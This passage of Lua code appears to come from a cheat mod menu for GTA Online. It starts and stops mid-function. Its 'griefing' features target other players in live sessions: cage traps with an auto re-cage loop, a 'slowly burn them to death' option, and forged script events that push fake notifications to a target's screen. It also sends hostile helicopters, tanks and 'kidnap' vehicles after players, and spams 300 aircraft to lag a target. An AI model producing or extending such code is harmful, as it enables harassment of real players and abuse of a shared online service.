	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object

	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90

	ENTITY.FREEZE_ENTITY_POSITION(cage_object, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object2, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object3, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object4, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object5, true)
	util.yield(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)





---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "Average X-Force User", {"trashcage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 684586828
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + 1, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)
	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

---------------------------------------------------------------------------------------------------------------------------------

menu.action(cage_options, "money cage", {"moneycage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("bkr_prop_moneypack_03a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z, true, true, false) -- right

	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z + .25, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z + .25, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z + .25, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z + .25, true, true, false) -- right

	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield(15)
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)


----------------------------------------------------------------------------------------------------------------------------------







	menu.action(cage_options, "Stunt Tube", {"stuntcage"}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		STREAMING.REQUEST_MODEL(2081936690)

		while not STREAMING.HAS_MODEL_LOADED(2081936690) do		
			util.yield()
		end
		local cage_object = OBJECT.CREATE_OBJECT(2081936690, pos.x, pos.y, pos.z, true, true, false)
		cages[#cages + 1] = cage_object
		util.yield(15)
		local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
		rot.y = 90
		ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
	end)
							
	local cage_loop = false
	menu.toggle(cage_options, "automatic", {"autocage"}, "Cage them in a trap. If they get out... Do it again. No, I'll do it for you actually", function(on)
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local a = ENTITY.GET_ENTITY_COORDS(player_ped) --first position
		cage_loop = on
		if cage_loop then
			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
				util.yield(300)
				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
					notification("Failed to kick player out of the vehicle", colors.red)
					menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
					return
				end
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
				a =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
			end
			cage_player(a)
		end
		while cage_loop do
			local b = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) --current position
			local ba = {x = b.x - a.x, y = b.y - a.y, z = b.z - a.z} 
			if math.sqrt(ba.x * ba.x + ba.y * ba.y + ba.z * ba.z) >= 4 then --now I know there's a native to find distance between coords but I like this >_<
				a = b
				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
					goto continue
				end
				cage_player(a)
				notification(PLAYER.GET_PLAYER_NAME(pid).." was out of the cage. Doing it again", colors.red)
				::continue::
			end
			util.yield(1000)
		end
	end)



	
menu.action(cage_options, "Slowly Burn Them To Death", {}, "use this to slowly kill the poor caged person (ONLY WORKS WITH SOME CAGES)", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("prop_beach_fire")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do
		STREAMING.REQUEST_MODEL(hash)	
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1.75, true, true, false) -- front

	cages[#cages + 1] = cage_object

	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
end)


	menu.action(cage_options, "Release Player", {"release"}, "Attempts to delete spawned cages, for more complicated traps it will delete one side.", function() -- ez fix but lazy
		for key, value in pairs(cages) do
			entities.delete_by_handle(value)
		end
	end)


    menu.action(griefing, "Job SmS Notification", {"jobnotify"}, "It sends messages to anyone message appears like you started a job with notif above mini map", function(cl)
        menu.show_command_box_click_based(cl, "jobnotify "..players.get_name(pid):lower().." ") end, function(input)
            local event_data = {0x8E38E2DF, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
            input = input:sub(1, 127)
            for i = 0, #input -1 do
                local slot = i // 8
                local byte = string.byte(input, i + 1)
                event_data[slot + 3] = event_data[slot + 3] | byte << ((i-slot * 8)* 8)
            end
            util.trigger_script_event(1 << pid, event_data)
        end)

    menu.action(griefing, "Custom Label", {"label"}, "", function() menu.show_command_box("label "..players.get_name(pid).." ") end, function(label)
        local event_data = {0xD0CCAC62, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
        local out = label:sub(1, 127)
        if HUD.DOES_TEXT_LABEL_EXIST(label) then
            for i = 0, #out -1 do
                local slot = i // 8
                local byte = string.byte(out, i + 1)
                event_data[slot + 3] = event_data[slot + 3] | byte << ( (i - slot * 8) * 8)
            end
            util.trigger_script_event(1 << pid, event_data)
        else
            util.toast("Sorry, that isn't a valid label. :/")
        end
    end)

local function request_model(hash, timeout)
    timeout = timeout or 3
    STREAMING.REQUEST_MODEL(hash)
    local end_time = os.time() + timeout
    repeat
        util.yield()
    until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
    return STREAMING.HAS_MODEL_LOADED(hash)
end

    local player_pussy_army = {}
    local army_player = menu.list(griefing, "Pussy Army", {}, "")
    menu.click_slider(army_player, "Spawn Pussy Army", {}, "", 1, 50, 49, 1, function(val)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        pos.y = pos.y - 5
        pos.z = pos.z + 1
        local pussy = util.joaat("a_c_cat_01")
        request_model(pussy)
        for i = 1, val do
            player_pussy_army[i] = entities.create_ped(28, pussy, pos, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(player_pussy_army[i], true)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(player_pussy_army[i], true)
            PED.SET_PED_COMPONENT_VARIATION(player_pussy_army[i], 0, 0, 1, 0)
            TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(player_pussy_army[i], ped, 0, -0.3, 0, 7.0, -1, 10, true)
            util.yield()
        end 
    end)

    menu.action(army_player, "Clear Pussy's", {}, "", function()
        for i, ped in ipairs(entities.get_all_peds_as_handles()) do
            if PED.IS_PED_MODEL(ped, util.joaat("a_c_cat_01")) then
                entities.delete_by_handle(ped)
            end
        end
    end)


	local trolly_vehicles = menu.list(griefing, "Trolly Vehicles")

	function set_ent_face_ent(ent1, ent2) --All credits to Ren for suggesting me this function
		local pos1 = ENTITY.GET_ENTITY_COORDS(ent1)
		local pos2 = ENTITY.GET_ENTITY_COORDS(ent2)
		local dx = pos2.x - pos1.x
		local dy = pos2.y - pos1.y
		local heading = MISC.GET_HEADING_FROM_VECTOR_2D(dx, dy)
		return ENTITY.SET_ENTITY_HEADING(ent1, heading)
	end
	function set_ped_can_be_knocked_off_veh(ped, state)
		native_invoker.begin_call()
		native_invoker.push_arg_int(ped)
		native_invoker.push_arg_int(state)
		native_invoker.end_call("7A6535691B477C48")
	end
	function add_blip_for_entity(entity, blipSprite, colour)
		local blip_ptr = memory.alloc()
		local blip = HUD.ADD_BLIP_FOR_ENTITY(entity)
		memory.write_int(blip_ptr, blip)
		HUD.SET_BLIP_SPRITE(blip, blipSprite)
		HUD.SET_BLIP_COLOUR(blip, colour)
		HUD.SHOW_HEIGHT_ON_BLIP(blip, false)
		HUD.SET_BLIP_ROTATION(blip, SYSTEM.CEIL(ENTITY.GET_ENTITY_HEADING(entity)))
		util.create_thread(function()
			local netId = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
			while NETWORK.NETWORK_DOES_ENTITY_EXIST_WITH_NETWORK_ID(netId) do
				HUD.SET_BLIP_ROTATION(blip, SYSTEM.CEIL(ENTITY.GET_ENTITY_HEADING(entity)))
				if ENTITY.IS_ENTITY_DEAD(NETWORK.NET_TO_ENT(netId)) then
					break	
				end
				util.yield()
			end
			HUD.SET_BLIP_DISPLAY(blip, 0)
			--HUD.REMOVE_BLIP(memory.read_int(blip_ptr))
			memory.free(blip_ptr)
		end)
		return blip
	end

	local config_list = {
		['controls'] = {
			['Vehicle Weapons'] = 86,
			['Airstrike Aircraft'] = 86
		},
		['driving style'] = {
			['Bandito Driving Style'] = 786988
		}
	}
	local function delete_entities_by_model(model)
		local hash = util.joaat(model)
		if STREAMING.IS_MODEL_A_VEHICLE(hash) then
			for k, vehicle in pairs(entities.get_all_vehicles_as_handles()) do
				if ENTITY.GET_ENTITY_MODEL(vehicle) == hash then
					for k, ped in pairs(entities.get_all_peds_as_handles()) do
						if PED.GET_VEHICLE_PED_IS_IN(ped, true) == vehicle then
							if not PED.IS_PED_A_PLAYER(ped) then
								ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ped, false, false); entities.delete_by_handle(ped)
							else
								goto continue
							end
						end
					end
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle, false, false); entities.delete_by_handle(vehicle)
					::continue::
				end
			end
			return
		end
		if STREAMING.IS_MODEL_A_PED(hash) then
			for k, ped in pairs(entities.get_all_peds_as_handles()) do
				if ENTITY.GET_ENTITY_MODEL(ped) == hash then
					if not PED.IS_PED_A_PLAYER(ped) then
						ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ped, false, false); entities.delete_by_handle(ped)
					end
				end
			end
			return
		end
		for k, object in pairs(entities.get_all_objects_as_handles()) do
			if ENTITY.GET_ENTITY_MODEL(object) == hash then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false); entities.delete_by_handle(object)
			end
		end
	end

	local function spawn_trolly_vehicle(pid, vehicleHash, pedHash)
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
		local coords_ptr, nodeId = memory.alloc(), memory.alloc()
		local coords
		if not PATHFIND.GET_RANDOM_VEHICLE_NODE(pos.x, pos.y, pos.z, 100, 0, 0, 0, coords_ptr, nodeId) then
			pos.x = pos.x + math.random(-20,20)
			pos.y = pos.y + math.random(-20,20)
			PATHFIND.GET_CLOSEST_VEHICLE_NODE(pos.x, pos.y, pos.z, coords_ptr, 1, 100, 2.5)
			coords = memory.read_vector3(coords_ptr)
		else
			coords = memory.read_vector3(coords_ptr)
		end
		memory.free(coords_ptr); memory.free(nodeId)

		local vehicle = entities.create_vehicle(vehicleHash, coords, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
		if not ENTITY.DOES_ENTITY_EXIST(vehicle) then
			local tick = 0
			while not ENTITY.DOES_ENTITY_EXIST(vehicle) and tick <= 10 do
				vehicle = entities.create_vehicle(vehicleHash, coords, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
				tick = tick + 1
				util.yield()
			end
		end
		VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
		for i = 0, 50 do
			VEHICLE.SET_VEHICLE_MOD(vehicle, i, VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i) - 1, false)
		end
		VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
		VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
		VEHICLE.SET_VEHICLE_IS_CONSIDERED_BY_PLAYER(vehicle, false)
		set_ent_face_ent(vehicle, player_ped)

		local driver = entities.create_ped(5, pedHash, coords, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
		PED.SET_PED_COMBAT_ATTRIBUTES(driver, 1, true)
		PED.SET_PED_INTO_VEHICLE(driver, vehicle, -1)
		PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
		TASK.TASK_VEHICLE_MISSION_PED_TARGET(driver, vehicle, player_ped, 6, 500.0, config_list['driving style']['Bandito Driving Style'], 0.0, 0.0, true)
		set_ped_can_be_knocked_off_veh(driver, 1)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash); STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehicleHash)
		return vehicle, driver
	end
	
	local bandito_godmode = false
	
	menu.divider(trolly_vehicles, "Bandito")
	
	menu.click_slider(trolly_vehicles, 'Send Bandito', {'sendbandito'}, '', 1,25,1,1, function(quantity)
		local bandito_hash = util.joaat("rcbandito")
		local ped_hash = util.joaat('mp_m_freemode_01')
		STREAMING.REQUEST_MODEL(bandito_hash); STREAMING.REQUEST_MODEL(ped_hash)
		while not STREAMING.HAS_MODEL_LOADED(bandito_hash) and not STREAMING.HAS_MODEL_LOADED(ped_hash) do
			util.yield()
		end
		for i = 1, quantity do
			local bandito, driver = spawn_trolly_vehicle(pid, bandito_hash, ped_hash)
			add_blip_for_entity(bandito, 646, 4)
			ENTITY.SET_ENTITY_INVINCIBLE(bandito, bandito_godmode)
			ENTITY.SET_ENTITY_VISIBLE(driver, false, 0)
			notification("Spawned some annoying ass cars", colors.red)
			util.yield(150)
		end
	end)

	menu.toggle(trolly_vehicles, "Invincible", {}, "", function(on)
		bandito_godmode = on
	end, false)

	menu.action(trolly_vehicles, "Delete Banditos", {}, "", function()
		delete_entities_by_model("rcbandito")
	end)

-------------------------------------
--GO KART
-------------------------------------

	local gokart_godmode = false
	menu.divider(trolly_vehicles, 'Go-Kart')

	menu.click_slider(trolly_vehicles, 'Send Go-Kart', {'sendgokart'}, '',1, 15, 1, 1, function(quantity)
		local vehicleHash = util.joaat("veto2")
		local pedHash = util.joaat('mp_m_freemode_01')
		
		while not STREAMING.HAS_MODEL_LOADED(vehicleHash) and not STREAMING.HAS_MODEL_LOADED(pedHash) do
			STREAMING.REQUEST_MODEL(vehicleHash)
			STREAMING.REQUEST_MODEL(pedHash)
			util.yield()
		end
		for i = 1, quantity do
			local gokart, driver = spawn_trolly_vehicle(pid, vehicleHash, pedHash)
			add_blip_for_entity(gokart, 748, 5)
			ENTITY.SET_ENTITY_INVINCIBLE(gokart, gokart_godmode)
			VEHICLE.SET_VEHICLE_COLOURS(gokart, 89, 0)
			VEHICLE.TOGGLE_VEHICLE_MOD(gokart, 18, true)
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(gokart, 250)
			ENTITY.SET_ENTITY_INVINCIBLE(driver, gokart_godmode)
			PED.SET_PED_COMPONENT_VARIATION(driver, 3, 111, 13, 2)
			PED.SET_PED_COMPONENT_VARIATION(driver, 4, 67, 5, 2)
			PED.SET_PED_COMPONENT_VARIATION(driver, 6, 101, 1, 2)
			PED.SET_PED_COMPONENT_VARIATION(driver, 8, -1, -1, 2)
			PED.SET_PED_COMPONENT_VARIATION(driver, 11, 148, 5, 2)
			PED.SET_PED_PROP_INDEX(driver, 0, 91, 0, true)
			util.yield(150)
		end
	end)

	menu.toggle(trolly_vehicles, 'Invincible Go-Kart', {}, '', function(toggle)
		gokart_godmode = toggle
	end)

	menu.action(trolly_vehicles, 'Delete Go-Karts', {}, '', function()
		delete_entities_by_model('veto2')
	end)

	orbliterate = menu.list(griefing, "Orbliterate", {"orbliterate"}, "")

	menu.action(orbliterate, "Orbliterate", {}, "Press once to target, twice to fire. Stop spectating to cancel :)", function(on_click)
        	if pid ~= players.user() then
			if waiting then
				do_fade_in(pid)
				notification("Click again to fire!", colors.red)
				return 
			end
			waiting = true
			if not NETWORK.NETWORK_IS_IN_SPECTATOR_MODE() then
				do_fade_in(pid)
				return
			end
			util.toast("FIRE!")
			orbital(pid) 
			do_fade_out(pid)
		end
			
    	end)

	menu.action(orbliterate, "Unfuck Orbliterate", {"unfuckorbliterate"}, "If you somehow get it stuck, try this to undo it", function(on_click)
		do_fade_out(pid)
	end)

	menu.action(griefing, "Monkey Drop", {"monkeydrop"}, "", function()
		PlayerName = PLAYER.GET_PLAYER_NAME(pid)
		
		local hash = util.joaat("a_c_chimp")
		while not STREAMING.HAS_MODEL_LOADED(hash) do
			STREAMING.REQUEST_MODEL(hash)
			util.yield()
		end
		for i = 1, 69 do
			PlayerCoords = NETWORK._NETWORK_GET_PLAYER_COORDS(pid)
			MonkeCoords = {
				["x"] = PlayerCoords.x,
				["y"] = PlayerCoords.y,
				["z"] = PlayerCoords.z + 3
			}
			entities.create_ped(28, hash, MonkeCoords, 0)
			util.yield(50)
		end
	end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(griefing,"Volatol Spam Player", {}, "spams volatols on target player, huge AOE", function() -- cpu burn simulator v2
		while not STREAMING.HAS_MODEL_LOADED(447548909) do
			STREAMING.REQUEST_MODEL(447548909)
			util.yield(10)
		end
		local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) --save location
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)

		notification("Started lagging the fuck out of him", colors.red)
		menu.trigger_commands("anticrashcamera on")
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 300
		while spam_amount >= 1 do
			entities.create_vehicle(447548909, PlayerPedCoords, 0)
			spam_amount = spam_amount - 1
			util.yield(10)
		end
		notification("Done", colors.red) -- cpu burned congrats
		menu.trigger_commands("anticrashcamera off")
	end)
----------------------------------------------------------------------------------------------------------------------- attacker buzzard --------------------------------------------------------

	local gunner_weapon_list = {              --these are the buzzard's gunner weapons 
	{"Combat MG", "weapon_combatmg"},
	{"RPG", "weapon_rpg"}
}

buzzard_entities = {}
function spawn_buzzard(pid, gunner_weapon, collision)
	local player_ped =  PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
	pos.x = pos.x + math.random(-20, 20)
	pos.y = pos.y + math.random(-20, 20)
	pos.z = pos.z + math.random(20, 40)

	PED.SET_PED_RELATIONSHIP_GROUP_HASH(player_ped, util.joaat("PLAYER"))

	local heli_hash = util.joaat("buzzard2")
	local ped_hash = util.joaat("s_m_y_blackops_01")
	STREAMING.REQUEST_MODEL(ped_hash)
	STREAMING.REQUEST_MODEL(heli_hash)
	while not STREAMING.HAS_MODEL_LOADED(ped_hash) or not STREAMING.HAS_MODEL_LOADED(heli_hash) do
		util.yield()
	end
	local heli = entities.create_vehicle(heli_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
	buzzard_entities[#buzzard_entities + 1] = heli
	
	if not collision then
		VEHICLE._DISABLE_VEHICLE_WORLD_COLLISION(heli)
	end
	
	ENTITY.SET_ENTITY_INVINCIBLE(heli, buzzard_godmode)
	ENTITY.SET_ENTITY_VISIBLE(heli, buzzard_visible, 0)	
	VEHICLE.SET_VEHICLE_ENGINE_ON(heli, true, true, true)
	VEHICLE.SET_HELI_BLADES_FULL_SPEED(heli)
		
	local pilot = entities.create_ped(5, ped_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
	buzzard_entities[#buzzard_entities + 1] = pilot
	
	PED.SET_PED_RELATIONSHIP_GROUP_HASH(pilot, util.joaat("ARMY"))
	ENTITY.SET_ENTITY_VISIBLE(pilot, buzzard_visible, 0)
	PED.SET_PED_INTO_VEHICLE(pilot, heli, -1)
	PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(pilot, true)

	PED.SET_PED_MAX_HEALTH(pilot, 500)
	ENTITY.SET_ENTITY_HEALTH(pilot, 500)
	ENTITY.SET_ENTITY_INVINCIBLE(pilot, buzzard_godmode)
	--TASK.TASK_COMBAT_HATED_TARGETS_AROUND_PED(pilot, 500, 0)

	local gunner = {}
	for i  = 1,2 do
		gunner[i] = entities.create_ped(29, ped_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
		buzzard_entities[#buzzard_entities + 1] = gunner[i]
		PED.SET_PED_INTO_VEHICLE(gunner[i], heli, i)
		WEAPON.GIVE_WEAPON_TO_PED(gunner[i], util.joaat(gunner_weapon) , 9999, false, true)
		PED.SET_PED_COMBAT_ATTRIBUTES(gunner[i], 20 --[[ they can shoot from vehicle ]], true)
		--PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(gunner[i], true)
		PED.SET_PED_MAX_HEALTH(gunner[i], 500)
		ENTITY.SET_ENTITY_HEALTH(gunner[i], 500)
		ENTITY.SET_ENTITY_INVINCIBLE(gunner[i], buzzard_godmode)
		ENTITY.SET_ENTITY_VISIBLE(gunner[i], buzzard_visible, 0)
		PED.SET_PED_SHOOT_RATE(gunner[i], 1000)
		PED.SET_PED_RELATIONSHIP_GROUP_HASH(gunner[i], util.joaat("ARMY"))
		TASK.TASK_COMBAT_HATED_TARGETS_AROUND_PED(gunner[i], 1000, 0)
	end
	
	util.create_tick_handler(function()
		PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, util.joaat("ARMY"), util.joaat("PLAYER"))
		PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, util.joaat("PLAYER"), util.joaat("ARMY"))
		PED.SET_RELATIONSHIP_BETWEEN_GROUPS(0, util.joaat("ARMY"), util.joaat("ARMY"))
	end)

	notification("Buzzard sent to "..PLAYER.GET_PLAYER_NAME(pid), colors.red)
	return pilot, heli
end	

	local buzzard_options = menu.list(griefing, "Enemy Buzzard", {}, "")

	menu.divider(buzzard_options, "Enemy Buzzard")

	buzzard_visible = true
	local gunner_weapon = "weapon_combatmg"
	
	menu.action(buzzard_options, "Spawn Buzzard", {}, "", function()
		local pilot, heli = spawn_buzzard(pid, gunner_weapon, collision)

		while ENTITY.GET_ENTITY_HEALTH(pilot) > 0 do
			local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
			local a = ENTITY.GET_ENTITY_COORDS(player_ped)
			local b = ENTITY.GET_ENTITY_COORDS(heli)
			if MISC.GET_DISTANCE_BETWEEN_COORDS(a.x, a.y, a.z, b.x, b.y, b.z, true) > 90 then
				TASK.TASK_HELI_CHASE(pilot, player_ped, 0, 0, 50)
			else
				TASK.TASK_HELI_MISSION(pilot, heli, 0, player_ped, a.x, a.y, a.z, 23, 30, -1, -1, 10, 10, 5, 0)
			end
			util.yield()
		end
	end)

	menu.divider(buzzard_options, "Settings")

	menu.toggle(buzzard_options, "Invincible", {}, "", function(on)
		buzzard_godmode = on
	end, false)
	
	local menu_gunner_weapon_list = menu.list(buzzard_options, "Gunners Weapon")
	menu.divider(menu_gunner_weapon_list, "Gunner Weapon List")

	for i = 1, #gunner_weapon_list do
		menu.action(menu_gunner_weapon_list, gunner_weapon_list[i][1], {}, "", function()
			gunner_weapon = gunner_weapon_list[i][2]
			notification("Now gunners will shoot with "..gunner_weapon_list[i][1].."s", colors.red)
		end)
	end

	menu.toggle(buzzard_options, "Visible", {}, "You shouldn't be that toxic to turn this off", function(on)
		buzzard_visible = on
	end, true)

	menu.toggle(buzzard_options, "Collision", {}, "When it's turned off disables world collision for Buzzard. Playes can still destroy the vehicle", function(on)
		collision = on
	end, false)

	menu.action(buzzard_options, "Delete All", {}, "Deletes all Buzzards you've spawned", function()
		for key, value in pairs(buzzard_entities) do
			entities.delete_by_handle(value)
		end
	end)

	menu.action(griefing,"Spawn Attacker Tank", {}, "", function()
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		if table_kidnap == nil then
			table_kidnap = {}
		end
        hash = util.joaat("rhino")
        ped_hash = util.joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)

            while not STREAMING.HAS_MODEL_LOADED(hash) do

                util.yield()
            end

            local aab = 
			{
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}

            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, false)

            table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
                                              CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)

            coords_ped = v3()
            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
            coords_ped.x = coords_ped.x + math.random(-20, 20)
            coords_ped.y = coords_ped.y + math.random(-20, 20)
            coords_ped.z = coords_ped.z

            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z, false, false, false, false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)

            VEHICLE.SET_VEHICLE_ENGINE_ON(table_kidnap[veh_to_attach], true, true, false)
            TASK.TASK_VEHICLE_SHOOT_AT_PED(ped_to_drive, V3, 1)
            TASK.TASK_VEHICLE_CHASE(ped_to_drive, V3)

            util.yield(1)
            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1

            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)

            --util.toast(os.date("%H:%M:%S") .. " DONE", TOAST_ABOVE_MAP)
        end
	end)

	menu.action(griefing,"Kidnap Player", {}, "", function()
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

		if table_kidnap == nil then
			table_kidnap = {}
		end

        hash = util.joaat("stockade")
        ped_hash = util.joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)

            while not STREAMING.HAS_MODEL_LOADED(hash) do
                util.yield()
            end

            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)

            local aab = 
			{
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}

            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)

            table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
            CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
